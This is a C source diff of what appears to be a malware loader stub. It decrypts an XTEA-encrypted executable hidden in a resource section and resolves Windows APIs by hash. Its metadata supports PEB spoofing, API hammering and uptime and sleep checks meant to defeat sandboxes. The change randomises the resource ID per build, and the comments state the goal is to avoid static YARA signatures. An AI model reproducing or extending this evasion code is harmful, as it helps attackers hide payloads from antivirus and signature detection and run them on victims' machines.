@@ -12,34 +12,42 @@ typedef BOOL    (WINAPI *pfnVirtualFree)(LPVOID, SIZE_T, DWORD);
 
 #define RESOLVE_API(TYPE, HMOD, HASH) ((TYPE)GetProcAddressH(HMOD, HASH))
 
+/* Per-build RT_RCDATA resource ID marker.
+ * Builder scans stub.bin for the 4-byte tag and patches bytes [4..5] with a
+ * CryptGenRandom LE WORD before embedding the payload.  Default 101 keeps an
+ * unpatched stub.bin usable for local debugging.
+ * Tag chosen to avoid collision with the TLS guard {CA FE F0 0D}. */
+volatile BYTE g_PayloadResIdMarker[6] = {
+    0xB1, 0x0B, 0x1D, 0xE0,  /* fixed tag — Builder search key */
+    0x65, 0x00               /* LE WORD resource ID (default = 101) */
+};
+
 /* GetPayloadFromResource
  *
- * Parses the 344-byte metadata block appended after the XTEA-encrypted blob
- * in the .rsrc section (Resource ID 101, RT_RCDATA).
+ * Parses the 280-byte PAYLOAD_METADATA block appended after the XTEA-encrypted
+ * blob in the .rsrc section (RT_RCDATA, per-build integer ID from g_PayloadResIdMarker).
  *
  * Metadata block layout (offsets from magic position p, growing toward lower addresses):
  *
  *   p[  0..  3]  magic          = key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]
  *   p[  -4.. -1] flags          = OPSEC_FLAG_* + EVASION_FLAG_* bitmask
- *   p[ -68.. -5] ppid_name      = parent process name for PPID spoof (64 bytes)
- *   p[ -72..-69] hammer_ms      = API-hammer duration (ms); 0 = default 3000
- *   p[ -76..-73] uptime_min     = uptime threshold (minutes); 0 = default 2
- *   p[ -80..-77] sleep_fwd_ms   = sleep-fwd duration (ms); 0 = default 500
- *   p[-112..-81] semaphore_name = exec-ctrl semaphore (32 bytes)
- *   p[-176..-113] spoof_exe     = PEB spoof / hollow target filename (64 bytes)
- *   p[-304..-177] exportArg     = export argument string (128 bytes)
- *   p[-308..-305] exportHash    = fixed-seed Djb2 hash of DLL export; 0 = none
- *   p[-312..-309] blobSize      = XTEA blob size
- *   p[-316..-313] stubSize      = mutated ASM decryptor size
- *   p[-320..-317] origSize      = original decompressed PE size
- *   p[-324..-321] dll+pad       = [dll_idx0, dll_idx1, dll_idx2, 0x00]
- *   p[-340..-325] key_salt      = per-build XTEA key salt (16 bytes / 4 DWORDs)
+ *   p[  -8.. -5] hammer_ms      = API-hammer duration (ms); 0 = default 3000
+ *   p[ -12.. -9] uptime_min     = uptime threshold (minutes); 0 = default 2
+ *   p[ -16..-13] sleep_fwd_ms   = sleep-fwd duration (ms); 0 = default 500
+ *   p[ -48..-17] semaphore_name = exec-ctrl semaphore (32 bytes)
+ *   p[-112..-49] spoof_exe      = PEB spoof filename (64 bytes)
+ *   p[-240..-113] exportArg     = export argument string (128 bytes)
+ *   p[-244..-241] exportHash    = per-build-seed Djb2 hash of DLL export; 0 = none
+ *   p[-248..-245] blobSize      = XTEA blob size
+ *   p[-252..-249] stubSize      = mutated ASM decryptor size
+ *   p[-256..-253] origSize      = original decompressed PE size
+ *   p[-260..-257] dll+pad       = [dll_idx0, dll_idx1, dll_idx2, 0x00]
+ *   p[-276..-261] key_salt      = per-build XTEA key salt (16 bytes / 4 DWORDs)
  *   (= 280 bytes total; kMagicOffset = 276; blob starts immediately before key_salt)
  *
- * Verification: scan backwards from end of resource (up to 64 bytes to tolerate
+ * Verification: scan backwards from end of resource (up to 128 bytes to tolerate
  * UpdateResource alignment padding) looking for a DWORD equal to XOR of the
- * 4 DWORDs that make up key_salt (32 bytes earlier in the resource).
- * No fixed magic constant is used, so YARA cannot anchor on a static value.
+ * 4 DWORDs that make up key_salt.  No fixed magic constant — no static YARA anchor.
  */
 BOOL GetPayloadFromResource(PBYTE*  ppRawPayload,
                              PDWORD  pdwPayloadSize,
@@ -72,8 +80,10 @@ BOOL GetPayloadFromResource(PBYTE*  ppRawPayload,
     if (!pSizeofResource) { if (pdwError) *pdwError = 93; return FALSE; }
     if (!pVirtualAlloc)   { if (pdwError) *pdwError = 94; return FALSE; }
 
-    /* Step 1: Locate and lock the RCDATA resource with ID 101 */
-    HRSRC   hRes = pFindResourceW(NULL, MAKEINTRESOURCEW(101), (LPCWSTR)10 /* RT_RCDATA */);
+    /* Step 1: Locate and lock RT_RCDATA at the per-build ID patched into the marker.
+     * Force a read of the volatile marker so the compiler cannot constant-fold it. */
+    WORD resId = (WORD)g_PayloadResIdMarker[4] | ((WORD)g_PayloadResIdMarker[5] << 8);
+    HRSRC hRes = pFindResourceW(NULL, MAKEINTRESOURCEW(resId), (LPCWSTR)10 /* RT_RCDATA */);
     if (!hRes) { if (pdwError) *pdwError = 100; return FALSE; }
 
     HGLOBAL hGlob    = pLoadResource(NULL, hRes);
